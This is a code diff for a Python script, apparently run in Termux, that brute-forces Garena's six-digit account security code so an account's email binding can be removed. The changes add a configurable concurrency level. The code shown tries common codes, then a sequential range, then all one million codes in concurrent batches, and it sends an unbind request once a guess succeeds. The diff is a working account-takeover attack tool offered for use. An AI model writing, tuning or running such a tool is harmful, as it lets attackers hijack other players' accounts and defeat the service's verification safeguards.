@@ -2,7 +2,8 @@
 # -*- coding: utf-8 -*-
 """
 /fastbk standalone – Termux script for Garena security code bruteforce.
-Usage: python fastbk.py
+Usage: python fastbk.py [concurrency]
+Example: python fastbk.py 300
 """
 
 import asyncio
@@ -74,7 +75,6 @@ async def brute_force_codes(
     stage_name: str = "",
     progress_callback=None
 ) -> tuple:
-    # Deduplicate
     if tested_set is not None:
         codes = [c for c in codes if c not in tested_set]
 
@@ -164,7 +164,7 @@ def generate_full_codes_file():
             for i in range(1000000):
                 f.write(f"{i:06d}\n")
 
-# ---------- Progress display (terminal) ----------
+# ---------- Progress display ----------
 def print_progress(tested: int, total: int, stage: str):
     percent = tested * 100 // total if total > 0 else 0
     bar_len = 30
@@ -173,10 +173,10 @@ def print_progress(tested: int, total: int, stage: str):
     sys.stdout.write(f'\r{stage}: {bar} {percent}% ({tested}/{total})')
     sys.stdout.flush()
     if tested == total:
-        print()  # newline after finish
+        print()
 
 # ---------- Main orchestrator ----------
-async def run_fastbk(token: str):
+async def run_fastbk(token: str, concurrency: int = 150):
     print("🔍 Fetching bind info...")
     try:
         bind = await get_bind_info(token)
@@ -221,9 +221,9 @@ async def run_fastbk(token: str):
     batch1 = common_list[:50000]
     batch2 = common_list[50000:100000]
 
-    print("🔍 Stage 1A: Trying first 50,000 common codes...")
+    print(f"🔍 Stage 1A: Trying first 50,000 common codes (concurrency={concurrency})...")
     found, identity = await brute_force_codes(
-        token, email, batch1, concurrency=150,
+        token, email, batch1, concurrency=concurrency,
         tested_set=tested_set,
         stage_name="1A",
         progress_callback=print_progress
@@ -233,9 +233,9 @@ async def run_fastbk(token: str):
         await finalize_unbind(token, identity)
         return
 
-    print("\n🔍 Stage 1B: Trying next 50,000 common codes...")
+    print(f"\n🔍 Stage 1B: Trying next 50,000 common codes (concurrency={concurrency})...")
     found, identity = await brute_force_codes(
-        token, email, batch2, concurrency=150,
+        token, email, batch2, concurrency=concurrency,
         tested_set=tested_set,
         stage_name="1B",
         progress_callback=print_progress
@@ -246,10 +246,10 @@ async def run_fastbk(token: str):
         return
 
     # ---- Stage 2: Extended 100k sequential ----
-    print("\n🔍 Stage 2: Trying 100,000 sequential (000000-099999)...")
+    print(f"\n🔍 Stage 2: Trying 100,000 sequential (000000-099999) (concurrency={concurrency})...")
     ext = [f"{i:06d}" for i in range(100000)]
     found, identity = await brute_force_codes(
-        token, email, ext, concurrency=150,
+        token, email, ext, concurrency=concurrency,
         tested_set=tested_set,
         stage_name="Stage 2",
         progress_callback=print_progress
@@ -260,12 +260,12 @@ async def run_fastbk(token: str):
         return
 
     # ---- Stage 3: Full 1M ----
-    print("\n🔍 Stage 3: Trying full 1,000,000 codes... (this may take hours)")
+    print(f"\n🔍 Stage 3: Trying full 1,000,000 codes (concurrency={concurrency})... (may take hours)")
     generate_full_codes_file()
     with open("HLO.txt", "r") as f:
         full = [line.strip() for line in f if line.strip()]
     found, identity = await brute_force_codes(
-        token, email, full, concurrency=150,
+        token, email, full, concurrency=concurrency,
         tested_set=tested_set,
         stage_name="Stage 3",
         progress_callback=print_progress
@@ -277,7 +277,7 @@ async def run_fastbk(token: str):
         print("❌ All stages exhausted. Unbind failed.")
 
 async def finalize_unbind(token: str, identity: str):
-    print("🔄 Sending unbind request...")
+    print("\n🔄 Sending unbind request...")
     resp = await unbind_with_identity(token, identity)
     try:
         j = json.loads(resp)
@@ -297,4 +297,13 @@ if __name__ == "__main__":
     if not token:
         print("❌ Token cannot be empty.")
         sys.exit(1)
-    asyncio.run(run_fastbk(token))
+
+    # Parse concurrency from command line
+    concurrency = 150
+    if len(sys.argv) > 1:
+        try:
+            concurrency = int(sys.argv[1])
+            print(f"⚡ Using concurrency: {concurrency}")
+        except ValueError:
+            print("⚠️ Invalid concurrency value, using default 150.")
+    asyncio.run(run_fastbk(token, concurrency))
